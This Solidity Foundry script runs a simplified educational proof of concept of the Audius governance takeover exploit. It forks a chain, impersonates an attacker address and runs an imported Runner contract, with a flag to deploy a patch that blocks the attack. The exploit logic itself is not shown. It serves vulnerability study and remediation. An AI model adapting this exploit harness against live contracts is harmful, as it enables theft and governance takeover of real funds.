// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "./Constants.sol";
import "../src/Runner.sol";
import "../src/Patch.sol";

/**
    Proof of concept script for the governance takeover bug on Audius.

    This script is a more simplified version built for educational purposes.

    For details on the real attack, resolution and fixes,
    refer to Audius' official blog post at
    https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22
 */
contract RunnerScript is Script {
    // set this flag to `true` to use the patched version that prevents the issue
    bool private constant USE_PATCHED_VERSION = false;

    function setUp() public {
        vm.createSelectFork(FORK_URL, BLOCK_NUMBER);
    }

    function run() public {
        if (USE_PATCHED_VERSION) {
            vm.deal(PATCHER_ADDRESS, 3 ether);
            vm.startPrank(PATCHER_ADDRESS);
            new SaveTheFunds(PATCHER_ADDRESS);
            vm.stopPrank();
        }

        vm.startPrank(ATTACKER_ADDRESS);

        Runner runner = new Runner();
        runner.run();
    }
}
